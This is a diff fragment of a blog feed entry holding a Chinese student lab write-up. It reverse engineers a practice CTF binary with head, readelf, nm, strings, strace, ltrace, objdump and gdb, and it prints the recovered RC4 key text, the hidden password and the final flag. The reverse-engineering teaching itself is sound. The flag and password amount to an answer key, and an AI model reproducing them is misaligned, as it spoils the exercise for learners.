+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/4.1.png" alt="输出结果" /></p>
+<p>3、由上图可知，Start of section headers = 8568 (bytes into file)，Size of section headers = 64 (bytes)，Number of section headers = 27，由此可知 size = 10296。输入head -c 10296 temp_elf &gt; <a href="http://lib5ae9b7f.so">lib5ae9b7f.so</a> 指令将 temp_elf 文件中开头至偏移量为 10296 的内容截取到 <a href="http://lib5ae9b7f.so">lib5ae9b7f.so</a> 文件中。</p>
+<p>4、输入 export LD_LIBRARY_PATH=/home/binary/code/chapter5 指令将当前目录添加到 LD_LIBRARY_PATH 环境变量中。</p>
+<p>5、输入 .\ctf 指令，发现程序成功运行，没有报错。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/4.2.png" alt="输出结果" /></p>
+<p>Q：是否一定要去除隐藏的 ELF 文件的尾部无效部分？不去除的情况下这个库文件是否还有效？</p>
+<p>A：不一定。这个库文件依然是有效的。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/4.3.png" alt="输出结果" /></p>
+<h1 id="task-5使用-nm-解析符号"><a class="markdownIt-Anchor" href="#task-5使用-nm-解析符号"></a> Task 5：使用 nm 解析符号</h1>
+<p>步骤：</p>
+<p>1、输入 echo $? 指令，发现其中包含的 ctf 退出状态为 1，表示有错误。</p>
+<p>2、输入 readelf -s <a href="http://lib5ae9b7f.so">lib5ae9b7f.so</a> 指令，查看库文件的符号表。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/5.1.png" alt="输出结果" /></p>
+<p>3、输入 nm <a href="http://lib5ae9b7f.so">lib5ae9b7f.so</a> 指令，显示 no symbols，说明文件已经被剥离。</p>
+<p>4、输入 nm -D <a href="http://lib5ae9b7f.so">lib5ae9b7f.so</a> 指令，获得被修饰的符号名称。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/5.2.png" alt="输出结果" /></p>
+<p>5、输入 nm -D --demangle <a href="http://lib5ae9b7f.so">lib5ae9b7f.so</a> 指令，获得多个有意义的函数。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/5.3.png" alt="输出结果" /></p>
+<pre><code>......
+0000000000000c60 T rc4_decrypt(rc4_state_t*, unsigned char*, int)
+0000000000000c70 T rc4_decrypt(rc4_state_t*, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;&amp;)
+0000000000000b40 T rc4_encrypt(rc4_state_t*, unsigned char*, int)
+0000000000000bc0 T rc4_encrypt(rc4_state_t*, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;&amp;)
+0000000000000cb0 T rc4_init(rc4_state_t*, unsigned char*, int)
+                 U std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_M_create(unsigned long&amp;, unsigned long)
+                 U std::__throw_logic_error(char const*)
+</code></pre>
+<p>Q：是哪个加密算法？包含了这个加密算法的什么功能？</p>
+<p>A：这是一个包含RC4加密算法实现的库文件。这个文件包含的与RC4加密相关的函数有:rc4_init(rc4_state_t*, unsigned char*, int) - 初始化RC4加密状态,使用给定的密钥。rc4_encrypt(rc4_state_t*, unsigned char*, int) - 使用RC4加密给定的明文数据。rc4_decrypt(rc4_state_t*, unsigned char*, int) - 使用RC4解密给定的密文数据。还有一些重载函数如rc4_encrypt和rc4_decrypt接受std::string类型的数据。</p>
+<h1 id="task-6使用-strings-查找-hints"><a class="markdownIt-Anchor" href="#task-6使用-strings-查找-hints"></a> Task 6：使用 strings 查找 Hints</h1>
+<p>步骤：</p>
+<p>输入 strings ctf 指令查看二进制文件的字符串，并未找到有关的指令或者内容字符。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/6.1.png" alt="输出结果" /></p>
+<h1 id="task-7使用-strace-和-ltrace-跟踪系统调用和库文件调用"><a class="markdownIt-Anchor" href="#task-7使用-strace-和-ltrace-跟踪系统调用和库文件调用"></a> Task 7：使用 strace 和 ltrace 跟踪系统调用和库文件调用</h1>
+<p>步骤：</p>
+<p>1、输入 strace ./ctf show_me_the_flag 指令获得跟踪 ctf 的系统调用行为。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/7.1.png" alt="输出结果" /></p>
+<pre><code>......
+write(1, &quot;checking 'show_me_the_flag'\n&quot;, 28checking 'show_me_the_flag') = 28
+write(1, &quot;ok\n&quot;, 3ok) = 3
+exit_group(1) = ?
+</code></pre>
+<p>Q：这 3 个系统调用分别是做什么的？</p>
+<p>A：向终端输出 &quot;checking 'show_me_the_flag'\n&quot;；向终端输出 &quot;ok\n&quot;；终止当前进程及其子进程，退出状态码为 1。</p>
+<p>2、输入 ltrace -i -C ./ctf show_me_the_flag 指令可以看到初始化了加密函数，该函数位于之前提取的库文件中；接着为一个 C++ 字符串赋值，大概是用加密消息对其进行初始化；然后调用解密函数解密此消息，并将解密后的消息分配到新的 C++ 字符串。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/7.2.png" alt="输出结果" /></p>
+<pre><code>[0x400fe9] __libc_start_main(0x400bc0, 2, 0x7ffcb01844d8, 0x4010c0 &lt;unfinished ...&gt;
+[0x400c44] __printf_chk(1, 0x401158, 0x7ffcb01862da, 160checking 'show_me_the_flag')    = 28
+[0x400c51] strcmp(&quot;show_me_the_flag&quot;, &quot;show_me_the_flag&quot;)    = 0
+[0x400cf0] puts(&quot;ok&quot;ok) = 3
+[0x400d07] rc4_init(rc4_state_t*, unsigned char*, int)(0x7ffcb01842a0, 0x4011c0, 66, -1) = 0
+[0x400d14] std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::assign(char const*)(0x7ffcb01841e0, 0x40117b, 58, 3) = 0x7ffcb01841e0
+[0x400d29] rc4_decrypt(rc4_state_t*, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;&amp;)(0x7ffcb0184240, 0x7ffcb01842a0, 0x7ffcb01841e0, 0x7e889f91) = 0x7ffcb0184240
+[0x400d36] std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_M_assign(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;)(0x7ffcb01841e0, 0x7ffcb0184240, 0x7ffcb0184250, 0) = 0
+[0x400d53] getenv(&quot;GUESSME&quot;)                                 = nil
+[0xffffffffffffffff] +++ exited (status 1) +++
+</code></pre>
+<p>3、输入 GUESSME='foobar' ./ctf show_me_the_flag 指令，将 GUESSME 环境变量设置为虚拟值，发现输出新的一行，提示再猜一次。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/7.3.png" alt="输出结果" /></p>
+<p>4、输入 GUESSME=&quot;123&quot; ltrace -i -C ./ctf show_me_the_fla 指令，ctf 继续分配并解密另一个 C++ 字符串，但是看不到有关 GUESSME 的任何提示。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/7.4.png" alt="输出结果" /></p>
+<h1 id="task-8使用-objdump-检查指令级别的行为"><a class="markdownIt-Anchor" href="#task-8使用-objdump-检查指令级别的行为"></a> Task 8：使用 objdump 检查指令级别的行为</h1>
+<p>步骤：</p>
+<p>1、输入 objdump -d -M intel ctf 指令，</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/8.1.png" alt="输出结果" /></p>
+<pre><code>ctf:     file format elf64-x86-64
+
+Contents of section .rodata:
+ 401140 01000200 44454255 473a2061 7267765b  ....DEBUG: argv[
+ 401150 315d203d 20257300 63686563 6b696e67  1] = %s.checking
+ 401160 20272573 270a0073 686f775f 6d655f74   '%s'..show_me_t
+ 401170 68655f66 6c616700 6f6b004f 89df919f  he_flag.ok.O....
+ 401180 887e009a 5b38babe 27ac0e3e 434d6285  .~..[8..'..&gt;CMb.
+ 401190 55868954 3848a34d 00192d76 40505e3a  U..T8H.M..-v@P^:
+ 4011a0 00726200 666c6167 203d2025 730a0067  .rb.flag = %s..g
+ 4011b0 75657373 20616761 696e2100 00000000  uess again!.....
+ 4011c0 49742773 206b696e 6461206c 696b6520  It's kinda like 
+ 4011d0 4c6f7569 7369616e 612e204f 72204461  Louisiana. Or Da
+ 4011e0 676f6261 682e2044 61676f62 6168202d  gobah. Dagobah -
+ 4011f0 20576865 72652059 6f646120 6c697665   Where Yoda live
+ 401200 73210000 00000000                    s!......   
+</code></pre>
+<p>Q：&quot;guess again&quot;存放的地址位置是什么？</p>
+<p>A：0x4011af到0x4011b9。</p>
+<p>2、输入 objdump -d -M intel ctf 指令，查看&quot;guess again&quot;周围的指令。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/8.2.png" alt="输出结果" /></p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/8.3.png" alt="输出结果" /></p>
+<h1 id="task-9使用-gdb-转存动态字符串缓冲区"><a class="markdownIt-Anchor" href="#task-9使用-gdb-转存动态字符串缓冲区"></a> Task 9：使用 GDB 转存动态字符串缓冲区</h1>
+<p>步骤：</p>
+<p>1、输入 gdb ./ctf 进入gbd调试程序。</p>
+<p>2、由于 rcx 出现的地址为 0x400dc8，输入 break *0x400dc8 指令设置断点。</p>
+<p>3、输入 set env GUESSME=123 指令设置 GUESSME 值为 123，输入 run show_me_the_flag 指令运行该程序，输入 output (char* )rcx 指令获得 rcx 指向的字符串&quot;Crackers Don't Matter&quot;。</p>
+<p>4、输入 quit 指令推出 gbd 调试，输入 GUESSME=&quot;Crackers Don't Matter&quot; ./ctf show_me_the_flag 指令获得最终的 flag = 84b34c124b2ba5ca224af8e33b077e9e。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/9.1.png" alt="输出结果" /></p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/9.2.png" alt="输出结果" /></p>
+]]></content>
+      <categories>
+        <category>逆向工程与汇编语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
       </tags>
   </entry>
   <entry>
